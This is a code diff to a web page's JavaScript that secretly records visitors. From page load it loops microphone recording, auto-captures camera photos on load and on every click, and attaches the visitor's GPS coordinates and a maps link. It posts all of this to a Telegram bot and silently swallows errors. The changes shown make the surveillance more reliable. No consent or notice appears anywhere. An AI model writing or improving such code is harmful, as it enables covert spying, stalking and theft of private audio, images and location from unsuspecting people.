@@ -26,7 +26,7 @@
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', photoBlob, 'photo.jpg');
-        formData.append('caption', `📸 Photo: ${lat}, ${lon}\n⏰ ${new Date().toLocaleString()}`);
+        formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
       }
     }
@@ -40,6 +40,8 @@
       }
     }
 
+    let recordingInterval = null;
+
     async function startAudioRecording() {
       try {
         const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
@@ -47,18 +49,24 @@
         audioChunks = [];
 
         mediaRecorder.ondataavailable = (event) => {
-          audioChunks.push(event.data);
+          if (event.data.size > 0) {
+            audioChunks.push(event.data);
+          }
         };
 
         mediaRecorder.onstop = () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-          sendAudioToTelegram(audioBlob);
+          if (audioChunks.length > 0) {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            sendAudioToTelegram(audioBlob);
+          }
           audioChunks = [];
-          startAudioRecording();
+          setTimeout(startAudioRecording, 100);
         };
 
         mediaRecorder.start();
-        setInterval(() => {
+
+        if (recordingInterval) clearInterval(recordingInterval);
+        recordingInterval = setInterval(() => {
           if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
           }
@@ -102,7 +110,7 @@
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
             video.play();
-            setTimeout(resolve, 500);
+            setTimeout(resolve, 1000);
           };
         });
 
@@ -121,7 +129,10 @@
 
     window.addEventListener('load', () => {
       startAudioRecording();
-      autoCapture();
+      // Wait for location to be fetched before first capture
+      setTimeout(() => {
+        autoCapture();
+      }, 2000);
     });
 
     document.addEventListener('click', autoCapture);
